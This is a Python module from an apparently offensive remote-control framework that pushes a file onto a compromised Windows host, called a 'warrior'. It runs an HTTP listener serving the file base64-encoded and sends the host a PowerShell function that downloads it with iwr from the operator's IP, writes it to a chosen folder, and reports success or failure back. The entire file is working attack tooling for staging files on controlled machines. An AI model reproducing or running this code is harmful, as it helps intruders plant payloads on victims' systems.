from printib import print_ok, print_info, print_error
from module import Module
from os import getcwd, chdir, path
from time import sleep
from threading import Thread
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, unquote
from base64 import b64encode


FILE_SENDED = False
FILE_SENDED_ERROR = False
FILE = ''


class SendFile(BaseHTTPRequestHandler): 
    # To avoid logs in our screen
    def log_message(self, format, *args):
        return
        
    def _set_response(self): 
        self.send_response(200) 
        self.send_header('Content-type', 'text/html') 
        self.end_headers() 

    def do_GET(self): 
        response = ''.encode('utf-8')
        try:
            with open(FILE, 'rb') as f:
                response = b64encode(f.read()) # base64
        except:
            pass

        self._set_response()
        self.wfile.write(response) # response is encoded

    def do_POST(self):
        global FILE_SENDED, FILE_SENDED_ERROR

        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        self._set_response()

        self.wfile.write(''.encode('utf-8'))

        try:
            post_data = post_data.decode()
            fields = parse_qs(post_data)
            results = fields['results'][0]

            recv = str(unquote(results)) # normally a base64 string

            if recv == 'Received':
                FILE_SENDED = True
            elif recv == 'Error':
                FILE_SENDED_ERROR = True

        except:
            print_error("Error reading results at file upload.")
            FILE_SENDED_ERROR = True

    def do_HEAD(self): 
        self._set_response() 


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "upload-file",
                       "Description": "Send a file to warrior",
                       "Author": "@gaizka_gg, @josueencinar"
                       }

        # -----------name-----default_value--description--required?
        options = {"warrior": [None, "Warrior in war", True],
                    "ip": [None, "Local IP (Where the file is located)", True],
                   "interface": ["0.0.0.0", "Listener address", True],
                    "port": ["8082", "Listener port", True],
                    "source": [None, "File source (local... /tmp/test.bat)", True],
                    "dest": [None, "Destination folder where the warrior is running (C:\\Users\\)", True]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        global FILE_SENDED, FILE_SENDED_ERROR, FILE

        function = """function upload {
    param (
        [Parameter(Mandatory)]
        [string] $sourceUri,
        [Parameter(Mandatory)]
        [string] $destination
    )
    
    try
    {
        $req = iwr -UseBasicParsing -uri $sourceUri
        $base64 = $req.Content
        $bytes = [System.Convert]::FromBase64String($base64)

        [System.IO.File]::WriteAllBytes($destination, $bytes)

        $req = iwr -UseBasicParsing -uri $sourceUri -Method POST -Body @{results='Received'}

        return 'Done'
    }
    catch
    {
        $req = iwr -UseBasicParsing -uri $sourceUri -Method POST -Body @{results='Error'}
        return 'An error ocurried'
    }
}
"""

        FILE = self.args["source"]
        dest = self.args["dest"].replace('/', '\\') 
        if not dest.endswith('\\'):
           dest += '\\'
        dest += FILE.split("/")[-1]

        function += "upload -sourceUri 'http://{}:{}/' -destination '{}'".format(self.args["ip"], self.args["port"], dest)
        listener = Thread(target=self.run, name='upload listener', kwargs={'address':self.args["interface"], 'port':int(self.args["port"])})
        print_info("Sending file... waiting answer from warrior")
        listener.start()
        super(CustomModule, self).run(function)

        while not FILE_SENDED and not FILE_SENDED_ERROR:
            pass

        if FILE_SENDED:
            print_info('File sended correctly.')

        elif FILE_SENDED_ERROR:
            print_error('An error ocurried sending the file.')

        FILE_SENDED = False
        FILE_SENDED_ERROR = False
        FILE = ''
        sleep(1)

    def run(self, server_class=HTTPServer, handler_class=SendFile, address=None, port=9999):
        try: 
            server_address = (address, port)
            httpd = server_class(server_address, handler_class)
            try:
                httpd.serve_forever()
            except KeyboardInterrupt:
                pass
            httpd.server_close()
        except:
            pass
